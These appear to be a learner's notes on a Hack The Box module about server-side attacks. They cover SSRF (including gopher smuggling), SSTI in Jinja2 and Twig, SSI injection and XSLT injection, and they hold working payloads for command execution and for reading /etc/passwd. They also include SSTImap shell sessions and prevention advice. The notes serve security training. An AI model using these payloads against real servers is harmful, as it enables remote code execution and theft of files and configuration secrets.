# HTB: Server Side Attacks Module
****

In this module, we will discuss four classes of server-side vulnerabilities:

- Server-Side Request Forgery (SSRF)
- Server-Side Template Injection (SSTI)
- Server-Side Includes (SSI) Injection
- eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection

## Server-Side Request Forgery (SSRF)

### **Identifying SSRF**

By checking the date availability, a POST request is sent to a separate server

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/1.png)

**Confirming the SSRF:**  Supply a URL pointing to our system to the web application:

```bash
dateserver=http://<Attacker_machine>/test.php&date=2024-01-01
```

We got a GET request from our file, which confirms the vulnerability 

```bash
nc -lvnp 4444                                      
listening on [any] 4444 ...
connect to [10.10.16.155] from (UNKNOWN) [10.129.9.81] 59736
GET /test.php HTTP/1.1
Host: 10.10.16.155:4444
Accept: */*
```

and if we try to request an internal file, it will display it 

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/2.png)

Since the response contains the web application's HTML code, the SSRF vulnerability is not blind, i.e., the response is displayed to us.

**Enumerating the System:** To Fuzz for internal open ports, we first need to know the error message for a closed port 

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/3.png)
```bash
Error (7): Failed to connect to 127.0.0.1 port 81 after 0 ms: Couldn't connect to server
```

Remove the proxy switch if you don’t want it. 

```bash
seq 1 10000 > ports.txt
```

```bash
ffuf -w ports.txt \
  -u "http://10.129.9.81/index.php" \
> -X POST \
> -d "dateserver=http://127.0.0.1:FUZZ/index.php&date=2024-01-01" \
> -fr "Failed to connect to" \
> -H "Content-Type: application/x-www-form-urlencoded" \
> -x http://127.0.0.1:8080/
```

open ports:

```bash
80,8000,3306
```

request to the taget’s localhost on port 8000

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/4.png)
but the request to port 3306 returned this error 

```bash
Error (1): Received HTTP/0.9 when not allowed
```

### Exploring SSRF

**Accessing Restricted Endpoints:** As we have seen, the web application fetches availability information from the URL `dateserver.htb`. However, when we add this domain to our hosts file and attempt to access it, we are unable to do so:

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/5.png)

However, we can access and enumerate the domain through the SSRF vulnerability. For instance, we can conduct a directory brute-force attack to enumerate additional endpoints using `ffuf`. To do so, let us first determine the web server's response when we access a non-existent page:

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/6.png)

also to filter on forbidden requests, filter on the string `Server at dateserver.htb Port 80`

```bash
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt \
-u "http://10.129.9.105/index.php" \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-fr "Server at dateserver.htb Port 80" \
-d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -s 
```

Note that we are fuzzing for php files.  results:

```bash
admin
availability
```

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/7.png)
---

**Local File Inclusion (LFI) via SSRF:** By manipulating the URL scheme, an attacker can move from fetching remote web pages to reading local system files.

- **Protocol:** `file://`
- **Example:** Using `file:///etc/passwd` to read sensitive system information or `file:///var/www/html/config.php` to extract web application source code.

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/8.png)

---

**The Gopher Protocol (POST over SSRF):** Standard SSRF via `http://` is typically limited to **GET** requests. The `gopher://` protocol allows an attacker to send **arbitrary bytes** to a TCP socket, making it possible to construct complex requests.

- **Use Case:** Bypassing internal login forms that require **POST** parameters (e.g., `adminpw=admin`).
- **Process:**
    1. Manually construct the raw HTTP POST request.
        
        ```bash
        POST /admin.php HTTP/1.1
        Host: dateserver.htb
        Content-Length: 13
        Content-Type: application/x-www-form-urlencoded
        
        adminpw=admin
        ```
        
    2. URL-encode the request (especially spaces and newlines).
    3. Prefix with the gopher scheme and target: `gopher://<host>:<port>/_<encoded_payload>`.
        
        ```bash
        gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
        ```
        
    4. **Double URL-encode** the entire string if it is being sent as a parameter in another POST request to prevent "Malformed URL" errors.
        
        ```bash
        POST /index.php HTTP/1.1
        Host: 172.17.0.2
        Content-Length: 265
        Content-Type: application/x-www-form-urlencoded
        
        dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
        ```
        
        ![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/9.png)

        

**Automation with Gopherus:** Constructing manual Gopher payloads is time-consuming. **Gopherus** is a specialized tool that automates the generation of gopher URLs for various services:

| Supported Services | Description |
| --- | --- |
| **Databases** | MySQL, PostgreSQL |
| **Caching** | Redis, Memcache variants |
| **Messaging/Mail** | SMTP (for sending internal emails) |
| **Execution** | FastCGI (often leads to RCE) |

**Example (SMTP):** By providing sender, receiver, and message details to Gopherus, it generates a single gopher link that, when processed by the vulnerable SSRF endpoint, instructs the internal mail server to send an unauthorized email.

```bash
aishaxx@htb[/htb]$ python2.7 gopherus.py --exploit smtp

  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

Give Details to send mail: 

Mail from :  attacker@academy.htb
Mail To :  victim@academy.htb
Subject :  HelloWorld
Message :  Hello from SSRF!

Your gopher link is ready to send Mail: 

gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.

-----------Made-by-SpyD3r-----------
```

### Blind SSRF

Confirming blind SSRF:We can confirm the SSRF vulnerability just like we did before by supplying a URL to a system under our control and setting up a `netcat` listener:

```bash
dateserver=http://10.10.16.155:8000/index.php&date=2024-01-01
```

```bash
$ nc -lnvp 8000
listening on [any] 8000 ...
connect to [10.10.16.155] from (UNKNOWN) [10.129.9.125] 58716
GET /index.php HTTP/1.1
Host: 10.10.16.155:8000
Accept: */*
```

However, if we attempt to point the web application to itself, we can observe that the response does not contain the HTML response of the coerced request. Instead, it simply lets us know that the date is unavailable. Therefore, this is a blind SSRF vulnerability:

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/10.png)

and if we point to a closed port, it will return this error: 

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/11.png)

Port Fuzzing based on the observed response

```bash
ffuf -w ports.txt \
  -u "http://10.129.9.125/index.php" \
 -X POST \
 -d "dateserver=http://127.0.0.1:FUZZ/index.php&date=2024-01-01" \
 -fr "Something went wrong" \
 -H "Content-Type: application/x-www-form-urlencoded" 
```

 open ports:

```bash
80,5000
```

Furthermore, although we cannot read local files as before, we can still use the same technique to identify existing files on the filesystem. That is because the error message is different for existing 
and non-existing files, just like it differs for open and closed ports:

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/12.png)

For invalid files, the error message is different:

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/13.png)

While we cannot use blind SSRF vulnerabilities to directly exfiltratedata, as we did in the previous sections, we can employ the discussed techniques to enumerate open ports in the local network or enumerate existing files on the filesystem. This may reveal information about the underlying system architecture that can help prepare subsequent attacks.Keep in mind that even if the web application responds with the same error message for both open and closed ports, we can still interact with the internal network, albeit blindly. Therefore, we can potentially exploit internal web applications by guessing common payloads.

## Server-Side Template Injection

### Template Engines

Template engines are softwaretools that generate dynamic web pages by merging static templates (HTML with placeholders) with actual data on the server, replacing variables with values to create final HTML, CSS, or other text output, making it easier to separate design from logic for cleaner, more maintainable websites. They support features like loops, conditionals, and inheritance, allowing for reusable components (like headers/footers) and boosting performance through caching, significantly improving development efficiency and user experience. **How they work**

1. **Template Creation**: Developers write HTML files with special placeholders (e.g., `<h1>Hello, <%= name %></h1>`) and template tags.
2. **Data Integration**: At runtime, the engine takes the template and dynamic data (e.g., `{ name: 'John' }`).
3. **Rendering**: It processes the template, substituting placeholders with data and executing logic, to generate a complete HTML file.
4. **Output**: The final HTML is sent to the user's browser.

**Key advantages**

- **Separation of Concerns**: Keeps presentation (HTML) separate from business logic (code).
- **Dynamic Content**: Easily inserts data into pages without manual string concatenation.
- **Reusability**: Allows for base templates with reusable layouts (e.g., headers, footers).
- **Performance**: Template caching speeds up page loading.

**Popular Examples**

- **Jinja** (Python)
- **Handlebars.js** (JavaScript)
- **Django Templates** (Python)

### Server-Side Template Injection (SSTI)

**Server-Side Template Injection (SSTI)** is a critical vulnerability that occurs when an application improperly embeds user input into a server-side template. Instead of treating the input as plain text, the **template engine** parses it as executable code. This can lead to full server compromise (Remote Code Execution).

**Core Concept: Data vs. Code**

- **Secure Implementation:** The application uses a static template file and passes user data as a variable. The engine knows this data is "just text" and won't execute it.
- **Vulnerable Implementation:** The application dynamically builds the template string itself by concatenating user input into it before rendering. The engine treats the user's input as part of the template's logic.

---

**Example Scenario**

Imagine a web application that displays a personalized "Welcome" message.

**1. The Normal Use Case**

The user provides their name: `Alice`.

- **Template:** `Hello, {{ name }}`
- **Output:** `Hello, Alice`

**2. The Attacker's Use Case (SSTI)**

If the developer writes code like `render("Hello, " + user_input)`, an attacker doesn't provide a name; they provide a **template expression**.

If the attacker inputs `${7*7}` (for a Java-based engine) or `{{7*7}}` (for Jinja2/Python):

- **The Engine sees:** `Hello, {{7*7}}`
- **The Engine executes the math:** It calculates 7×7=49.
- **The Output:** `Hello, 49`

**Why this is dangerous:** If the attacker can make the server do math, they can eventually make it execute system commands, such as `{{ self.__init__.__globals__['os'].popen('whoami').read() }}` to identify the server user or steal sensitive files.

### Identifying SSTI

The process of identifying Server-Side Template Injection involves two main stages: **confirming** the vulnerability exists and **fingerprinting** the specific template engine being used.

---

**1. Confirming the Vulnerability**

Detection is similar to finding SQL Injection. You "break" the syntax by injecting a string of special characters common to template engines: `${{<%%'"}}%\`.

As seen the website taks the user input and renders it.

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/14.png)

Now inject `${{<%%'"}}%\` and If the server returns a 500 Error or a template-related exception, it indicates the input is being parsed rather than just stored.

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/15.png)

As we can see, the web application throws an error. While this does not confirm that the web application is vulnerable to SSTI, it should increase our suspicion that the parameter might be vulnerable.

---

**2. Identifying the Template Engine**

Because every engine (Jinja2, Twig, Mako, Smarty) has unique syntax and security features, you must identify which one is running to build a working exploit. This is done through a **decision-tree approach** using mathematical payloads.

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/16.png)

**The "7*7" Test Strategy**

We inject mathematical expressions and observe the output to narrow down the possibilities:

1. **Test `${7*7}`:**
    
    ![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/17.png)
    
    - **Success (Output: 49):** Likely a Java or PHP-based engine (like Smarty or Mako).
    - **Failure (Output: `${7*7}`):** Move to the next test.
2. **Test `{{7*7}}`:**
    
    
   ![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/18.png)

    
    - **Success (Output: 49):** Likely Jinja2 or Twig.
3. **The "Tie-Breaker" `{{7*'7'}}`:**
    
    ![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/19.png)
    
    - **Result `7777777`:** The engine is **Jinja2** (Python treats the string as a sequence to be repeated).
    - **Result `49`:** The engine is **Twig** (PHP-based, which may cast the string to an integer).

**Final answer is → Twig (PHP-based template)**

---

**Why Identification Matters:** Exploitation isn't "one size fits all." Once you know the engine, you can look up its specific documentation to find objects or functions (like Python's `__builtins__` or Twig's `_self`) that allow you to read files or execute system commands.

### **Exploiting SSTI - Jinja2**

Now that we have seen how to identify the template engine used by a web application vulnerable to SSTI, we will proceed to exploit the vulnerability. In this section, we will assume that we have successfully identified that the web application uses the `Jinja` template engine. Jinja is a template engine commonly used in Python web frameworks such as `Flask` or `Django`. This section will focus on a `Flask` web application. The payloads in other web frameworks might thus be slightly different.

---

1. **Information Disclosure:** we can obtain the web application's configuration using the following SSTI payload:

```bash
{{ config.items() }}
```

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/20.png)

```bash
Hi dict_items([(&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), 
(&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;SECRET_KEY&#39;, None), 
(&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(days=31)), 
(&#39;USE_X_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), 
(&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), 
(&#39;SESSION_COOKIE_DOMAIN&#39;, None), (&#39;SESSION_COOKIE_PATH&#39;, None), 
(&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_SECURE&#39;, False), 
(&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), 
(&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, None), 
(&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), 
(&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), 
(&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;MAX_COOKIE_SIZE&#39;, 4093)])!
```

Since this payload dumps the entire web application configuration, including any secret keys used, we can prepare further attacks using the obtained information. We can also execute Python code to obtain information about the web application's source code. We can use the following SSTI payload to dump all available built-in functions:

```bash
{{self.__init__.__globals__.__builtins__}}
```

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/21.png)

---

**Local File Inclusion (LFI):** We can use Python's built-in function `open` to include a local file. However, we cannot call the function directly; we need to call it from the `__builtins__` dictionary we dumped earlier. This results in the following payload to include the file `/etc/passwd`:

```python
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

```

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/22.png)

- I asked Gemini why we have to call a built-in function like `open()` like so. The answer:
    
    The short answer is: **Sandboxing.**
    
    In a normal Python script, you are the owner. In a template engine, you are a guest in a restricted room. Here is the breakdown of why those long "chains" are necessary.
    
    ---
    
    1. **The "Sandbox" Restriction:** Template engines like Jinja2 are designed to be safe. They don't want a web designer to accidentally (or intentionally) delete the database.
        - **Namespace Isolation:** When the engine renders a template, it only provides a small "whitelist" of safe objects (like the variables the developer explicitly passed).
        - **Missing Builtins:** Standard Python functions like `open()`, `eval()`, or `import` are **not** in the template's global scope. If you just type `{{ open('/etc/passwd') }}`, the engine looks in its small "guest" room, doesn't find it, and returns an error.
    
    1. **Why the long chain? (The "Jailbreak"):** Since we can't call `open()` directly, we have to find a way to crawl back into the main Python environment. We use **Introspection** to climb out of the sandbox.
        
        Think of it like being locked in a hotel room. You can't reach the lobby, but you find a telephone (`self`). You use the telephone to call the operator (`__init__`), who has access to the hotel's internal directory (`__globals__`), which eventually contains the keys to the basement (`__builtins__`).
        
        **Breaking down the payload:**
        
        - **`self`**: A reference to a current object available in the template.
        - **`.__init__`**: The initialization function of that object. This gets us into "Python land" rather than just "Template land."
        - **`.__globals__`**: A dictionary containing all the variables and modules available to that function’s scope.
        - **`.__builtins__`**: This is the "Holy Grail." It’s the collection of Python’s core functions (including `open`, `__import__`, etc.) that are usually hidden from the template.
    2. **Why dump the whole dictionary?** 
        
        We use `{{ self.__init__.__globals__.__builtins__ }}` for two main reasons:
        
        1. **Verification:** Every server environment is different. Some might have "hardened" sandboxes that have stripped away `open()`. Dumping the builtins confirms what "tools" are actually available in the toolbox.
        2. **Discovery:** Sometimes `open()` isn't there, but `__import__` is. If we have `__import__`, we can import the `os` module and execute system commands.

---

**Remote Code Execution (RCE):** To achieve remote code execution in Python, we can use functions provided by the `os` library, such as `system` or `open`. However, if the web application has not already imported this library, we must first import it by calling the built-in function `import`. This results in the following SSTI payload:

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

```

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/23.png)

to read the flag:

```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat+flag.txt').read()}} 
```

---

### **Exploiting SSTI - Twig**

Twig is a template engine for the PHP programming language.

---

1. **Information Disclosure:** In Twig, we can use the `_self` keyword to obtain a little information about the current template:

```php
{{ _self }}
```

result:

```python
__string_template__02145b9414205896aad1137d2ef732c7
```

However, as we can see, the amount of information is limited compared to `Jinja`.

---

1. **Local File Inclusion (LFI):** Reading local files (without using the same way as we will use for RCE) is not possible using internal functions directly provided by Twig. However, the PHP web framework Symfony defines additional Twig filters. One of these filters is file_excerpt and can be used to read local files:
    
    ```
    {{ "/etc/passwd"|file_excerpt(1,-1) }}
    ```
    

---

1. **Remote Code Execution (RCE):** To achieve remote code execution, we can use a PHP built-in function such as `system`. We can pass an argument to this function by using Twig's `filter` function, resulting in any of the following SSTI payloads:
    
    ```php
    {{ ['id'] | filter('system') }}
    ```
    
    result: 
    
    ![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/24.png)

    

**Further Remarks:** This module explored exploiting SSTI in the `Jinja` and `Twig`template engines. As we have seen, the syntax of each template engine differs slightly. However, the general idea behind SSTI exploitation remains the same. Therefore, exploiting an SSTI in a template engine the attacker is unfamiliar with is often as simple as becoming familiar with the syntax and supported features of that particular template engine. An attacker can achieve this by reading the documentation of the template engine. However, there are also SSTI cheat sheets that bundle payloads for popular template engines, such as the PayloadsAllTheThings SSTI CheatSheet.

### Automated Tools

We can use SSTImap to aid the SSTI exploitation process. 

Installation: 

```bash
$ git clone https://github.com/vladko312/SSTImap

# creating an isolated environment
$ python3 -m venv SSTI-venv  

# activate the environment
$ source SSTI-venv/bin/activate   

# Lastly install the requirements
$ pip3 install -r requirements.txt 
```

testing: 

```bash
$ python3 sstimap.py   

    ╔══════╦══════╦═══════╗ ▀█▀                                                           
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═                                                          
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __                                     
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \                                    
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |                                   
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/                                    
                             │                  | |                                       
                                                |_|                                       
[*] Version: 1.3.2
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 6; python: 4; ruby: 2; java: 4; generic: 5; javascript: 6; php: 3
[*] Loaded request body types: 6

[-] SSTImap requires target URL (-u, --url), URLs/forms file (--load-urls / --load-forms) or interactive mode (-i, --interactive)
```

Detect the SSTI vulnerability on the target: 

```bash
$ python3 sstimap.py -u "http://94.237.120.119:54364/index.php?name=test"

[+] SSTImap identified the following injection point:

  Query parameter: name
  Engine: Twig
  Injection: *
  Context: text
  OS: Linux
  Technique: rendered
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code

[+] Rerun SSTImap providing one of the following options:
    --interactive                Run SSTImap in interactive mode to switch between exploitation modes without losing progress.
    --os-shell                   Prompt for an interactive operating system shell.
    --os-cmd                     Execute an operating system command.
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.
    --tpl-shell                  Prompt for an interactive shell on the template engine.
    --tpl-cmd                    Inject code in the template engine.
    --bind-shell PORT            Connect to a shell bind to a target port.
    --reverse-shell HOST PORT    Send a shell back to the attacker's port.
    --upload LOCAL REMOTE        Upload files to the server.
    --download REMOTE LOCAL      Download remote files.

```

Additionally, we can execute a system command using the `-S` flag:

```bash
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Alternatively, we can use `--os-shell` to obtain an interactive shell:

```bash
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell

[+] Run commands on the operating system.
Linux $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Linux $ whoami
www-data
```

### Preventing Server-Side Template Injection (SSTI)

The following measures are recommended to prevent SSTI vulnerabilities and secure the web server:

- **Strict Input Isolation:** The primary defense is ensuring user input is never passed to the template engine's rendering function or template parameter. Code paths should be audited to guarantee user data is not added to a template prior to rendering.
- **Securing User-Defined Templates:** If the application requires users to upload or modify templates, you must implement hardening measures:
    - **Function Restriction:** Remove dangerous functions from the execution environment to prevent Remote Code Execution (RCE). *Note: This method is often prone to bypasses.*
    - **Environment Segregation (Recommended):** Isolate the template engine's execution environment entirely from the main web server, such as by running it inside a separate Docker container.

## SSI Inection

### Introduction to SSI Injection

**Server-Side Includes (SSI)** is a legacy web technology used to inject dynamic content into static HTML pages. While traditionally identified by extensions like `.shtml`, `.shtm`, or `.stm`, any file type can be configured to support SSI.

**Core Components:** SSI functionality relies on **directives** using the following syntax:

```html
<!--#name param1="value1" param2="value" -->
```

**Common Directives:**

- **`printenv`**: Displays all environment variables.
    
    ```html
    <!--#printenv -->
    ```
    
- **`config`**: Modifies SSI configurations (e.g., custom error messages).
    
    ```html
    <!--#config errmsg="Error!" -->
    ```
    
- **`echo`**: Outputs specific variables like `DOCUMENT_NAME` or `DATE_LOCAL`.
    
    ```html
    <!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
    ```
    
- **`exec`**: Executes server-side commands via the `cmd` parameter (high risk).
    
    ```html
    <!--#exec cmd="whoami" -->
    ```
    
- **`include`**: Embeds the contents of a file from the web root directory.
    
    ```html
    <!--#include virtual="index.html" -->
    ```
    

**SSI Injection Vulnerability:** An **SSI Injection** occurs when an application fails to sanitize user input before including it in a file processed by the SSI engine. This allows an attacker to insert malicious directives that the server then executes.

**Common Attack Vectors:**

- **File Uploads:** Uploading a malicious `.shtml` file to the web root.
- **Input Persistence:** Applications that save unsanitized user input (e.g., guestbooks or profiles) into files located in the web root.
- For more info about SSI visit Apache httpd Tutorial

---

### Exploiting SSI Injection

in this example, when we enter a name, we will be redirected to this page `/page.shtml`, which displays some general information:

   ![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/25.png)

We can guess that the page supports SSI based on the file extension. If our username is inserted into the page without prior sanitization, it might be vulnerable to SSI injection. Let us confirm 
this by providing a username of `<!--#printenv -->`. This results in the following page:

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/26.png)

Test if we can execute arbitrary commands using the `exec` directive by providing the following username: `<!--#exec cmd="id" -->`: 

On the index.php type the injection in the msg parameter

```html
/index.php?msg=<!--%23exec+cmd="id"+-->
```

then send a GET request to page.shtml

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/27.png)

---

### Preventing SSI Injection

To prevent Server-Side Inclusion (SSI) injection, developers and administrators must implement a layered defense strategy focusing on input handling and server hardening.

**Input Validation and Sanitization**

- **Filter User Input:** Treat all user-supplied data as untrusted. Rigorously validate and sanitize input before it is used within SSI directives.
- **File Integrity:** Ensure that user input is never written to files that the web server is configured to parse for SSI directives.

**Server Configuration and Hardening**

- **Restrict Scope:** Limit SSI execution to specific, necessary file extensions (e.g., `.shtml`) and designated directories rather than enabling it globally.
- **Disable Dangerous Directives:** Follow the principle of least privilege by disabling high-risk directives, such as `exec`, if they are not essential for the application’s functionality.
- **Feature Limitation:** Granularly control the capabilities of specific directives to minimize the potential impact should an injection occur.

## **XSLT Injection**

### Introduction to XSLT Injection

eXtensible Stylesheet Language Transformation (XSLT)is a language enabling the transformation of XML documents. For instance, it can select specific nodes from an XML document and change 
the XML structure.

In other word, the XSLT takes the XML documents and extracts or parses specific nodes using logic. 

Example: This is a simple XML document 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>
```

Now we will use XSL to operate on the provided XML document. The following are some commonly used XSL elements:

- `<xsl:template>`: This element indicates an XSL template. It can contain a `match` attribute that contains a path in the XML document that the template applies to
- `<xsl:value-of>`: This element extracts the value of the XML node specified in the `select` attribute
- `<xsl:for-each>`: This element enables looping over all XML nodes specified in the `select` attribute

For instance, a simple XSLT document used to output all fruits contained within the XML document, as well as their color, may look like this:

Code: xslt

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all the fruits:
		<xsl:for-each select="fruit">
			<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>

```

As we can see, the XSLT document contains a single `<xsl:template>` XSL element that is applied to the `<fruits>` node in the XML document. The template consists of the static string `Here are all the fruits:` and a loop over all `<fruit>` nodes in the XML document. For each of these nodes, the values of the `<name>` and `<color>` nodes are printed using the `<xsl:value-of>` XSL element. Combining the sample XML document with the above XSLT data results in the following output:

Code: txt

```
Here are all the fruits:
    Apple (Red)
    Banana (Yellow)
    Strawberry (Red)
```

Here are some additional XSL elements that can be used to narrow down further or customize the data from an XML document:

- `<xsl:sort>`: This element specifies how to sort elements in a for loop in the `select` argument. Additionally, a sort order may be specified in the `order` argument
- `<xsl:if>`: This element can be used to test for conditions on a node. The condition is specified in the `test` argument.

For instance, we can use these XSL elements to create a list of all 
fruits that are of a medium size, ordered by their color in descending 
order:

Code: xslt

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all fruits of medium size ordered by their color:
		<xsl:for-each select="fruit">
			<xsl:sort select="color" order="descending" />
			<xsl:if test="size = 'Medium'">
				<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
			</xsl:if>
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>

```

This results in the following data:

```
Here are all fruits of medium size ordered by their color:
	Banana (Yellow)
	Apple (Red)
```

XSLT can be used to generate arbitrary output strings. For instance, web applications may use it to embed data from XML documents within an HTML response.

---

### Exploiting XSLT Injection

We are provided a website that sort the modules based on the username 

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/28.png)

As we can see, the name we provide is reflected on the page. Suppose the web application stores the module information in an XML document and displays the data using XSLT processing. In that case, it might be vulnerable to XSLT injection if our name is inserted without sanitization before XSLT processing. To confirm this, let us try injecting a broken XML tag to provoke an error in the web application. We can achieve this by providing the username `<`:

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/29.png)

As we can see, the web application responds with a server error. While this does not definitively confirm the presence of an XSLT injection vulnerability, it may indicate the existence of a security 
issue.

---

1. **Information Disclosure:** 

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

in url: 

```xml
/index.php?name=Version:<xsl:value-of+select="system-property('xsl:version')"/><br/>Vendor:<xsl:value-of+select="system-property('xsl:vendor')"/><br/>Vendor-url:<xsl:value-of+select="system-property('xsl:vendor-url')"/><br/>Product-name:<xsl:value-of+select="system-property('xsl:product-name')"/><br/>
```

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/30.png)

Since the web application interpreted the XSLT elements we provided, this confirms an XSLT injection vulnerability. Furthermore, we can deduce that the web application seems to rely on the `libxslt` library and supports XSLT version `1.0`.

---

**2. Local File Inclusion (LFI):** We can try using multiple different functions to read a local file. 
Whether a payload will work depends on the XSLT version and the configuration of the XSLT library. For instance, XSLT contains a function `unparsed-text` that can be used to read a local file:

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

However, it was only introduced in XSLT version 2.0. Thus, our sample web application does not support this function and instead returns an error. However, if the XSLT library is configured to support PHP functions, we can call the PHP function `file_get_contents` using the following XSLT element:

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

Our sample web application is configured to support PHP functions. As such, the local file is displayed in the response:

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/31.png)

---

1. **Remote Code Execution (RCE):** If an XSLT processor supports PHP functions, we can call a PHP function that executes a local system command to obtain RCE. For instance, we can call the PHP function `system` to execute a command:

```xml
<xsl:value-of select="php:function('system','id')" />
```

![ALT](/HTB/Web_Penetration_Tester/Server_Side_Attacks/Images/32.png)

---

